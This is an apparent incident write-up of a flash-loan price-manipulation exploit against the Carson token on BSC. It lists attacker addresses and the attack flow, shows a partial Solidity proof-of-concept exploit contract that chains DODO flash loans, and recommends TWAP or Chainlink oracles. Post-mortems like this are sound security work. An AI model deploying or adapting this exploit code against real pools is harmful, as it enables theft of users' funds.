# Carson Flash Loan Price Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Carson |
| Date | 2023-07-01 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$150,000 USD |
| Attack Type | Flash Loan + Price Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x25bcbbb92c2ae9d0c6f4db814e46fd5c632e2bd3` |
| Attack Contract | `0x9cffc95e742d22c1446a3d22e656bb23835a38ac` |
| Attack TX | `0x37d921a6bb0ecdd8f1ec918d795f9c354727a3ff6b0dba98a512fceb9662a3ac` |
| Fork Block | 30,306,324 |

## 2. Vulnerable Code Analysis

Carson token's price oracle relied on real-time DEX prices. The attacker obtained a large amount of BUSDT via chained DPP Oracle flash loans, then artificially manipulated the Carson token price to realize a profit.

```solidity
// Vulnerable pattern: oracle using real-time DEX price
function getPrice(address token) external view returns (uint256) {
    // Vulnerable: uses spot price manipulable within a single block
    (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
    return uint256(reserve1) * 1e18 / uint256(reserve0);
}

// Carson token's special transfer mechanism
function _transfer(address from, address to, uint256 amount) internal override {
    // Vulnerable: manipulated oracle used in price-based calculation during transfer
    uint256 price = getPrice(address(this));
    uint256 feeAmount = calculateFee(amount, price);  // fee distorted via price manipulation
    // ...
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Price Manipulation
// Source code unverified — based on bytecode analysis
```

**Vulnerability**: Using DEX spot price as an oracle allowed price manipulation within a single transaction via flash loan.

## 3. Attack Flow

```
Attacker [0x25bcbbb92c2ae9d0c6f4db814e46fd5c632e2bd3]
  │
  ├─1─▶ DPPOracle1.flashLoan() [0x26d0c625e5F5D6de034495fbDe1F6e9377185618]
  ├─2─▶ DPPOracle2.flashLoan() [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  ├─3─▶ DPPOracle3.flashLoan() [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]
  ├─4─▶ DPP.flashLoan() [0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476]
  ├─5─▶ DPPAdvanced.flashLoan() [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]
  │      → Large amount of BUSDT obtained
  │
  ├─6─▶ BUSDT → Carson large swap
  │      [Router: 0x2bDFb2f33E1aaEe08719F50d05Ef28057BB6341a]
  │      Carson price spikes
  │
  ├─7─▶ Protocol interaction while Carson price is manipulated
  │      (fee distortion or arbitrage based on manipulated price)
  │
  ├─8─▶ Carson → BUSDT reverse swap
  │
  └─9─▶ All flash loans repaid + profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract CarsonExploit {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Carson = IERC20(0x0aCD5019EdC8ff765517e2e691C5EeF6f9c08830);
    IDPPOracle DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    Uni_Router_V2 router = Uni_Router_V2(0x2bDFb2f33E1aaEe08719F50d05Ef28057BB6341a);

    function testExploit() external {
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)) * 99 / 100, address(this), "0x01");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        if (keccak256(data) == keccak256("0x01")) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)) * 99 / 100, address(this), "0x02");
        } else if (keccak256(data) == keccak256("0x02")) {
            // Additional flash loan chain...
            _executeExploit();
        }
    }

    function _executeExploit() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(Carson);
        router.swapExactTokensForTokens(BUSDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp);
        // Protocol interaction after price manipulation
        // Reverse swap
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Oracle manipulation, flash loan price manipulation |
| Impact Scope | Carson-BUSDT liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/tx/0x37d921a6bb0ecdd8f1ec918d795f9c354727a3ff6b0dba98a512fceb9662a3ac) |

## 6. Security Recommendations

```solidity
// Fix 1: Use TWAP oracle (minimum 30 minutes)
contract SecureOracle {
    IUniswapV2Pair public pair;
    uint256 public constant TWAP_PERIOD = 30 minutes;

    function getPrice() external view returns (uint256) {
        // Uniswap V2 TWAP (manipulation-resistant)
        uint256 price0CumulativeLast = pair.price0CumulativeLast();
        (,, uint32 blockTimestampLast) = pair.getReserves();
        uint32 timeElapsed = uint32(block.timestamp) - blockTimestampLast;
        require(timeElapsed >= TWAP_PERIOD, "TWAP period not elapsed");
        // TWAP calculation...
    }
}

// Fix 2: Use Chainlink oracle
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

AggregatorV3Interface public priceFeed;

function getPrice() external view returns (uint256) {
    (,int256 price,,,) = priceFeed.latestRoundData();
    require(price > 0, "Invalid price");
    return uint256(price);
}
```

## 7. Lessons Learned

1. **DEX Spot Price Oracle Risk**: Using Uniswap/PancakeSwap spot prices as an oracle allows manipulation within a single block via flash loan. TWAP or Chainlink must be used instead.
2. **DPP Oracle Chained Flash Loans**: DODO DPP Oracles on BSC can be chained to provide flash loans sequentially, enabling large-scale capital acquisition. Price manipulation attacks exploiting this pattern are frequent.
3. **Low-Liquidity Token Vulnerability**: Tokens with lower liquidity are susceptible to price manipulation with relatively less capital.
4. **Multiple Flash Loan Pattern**: Receiving sequential flash loans from 5 or more DPP Oracles in a single transaction is a strong indicator of a manipulation attack.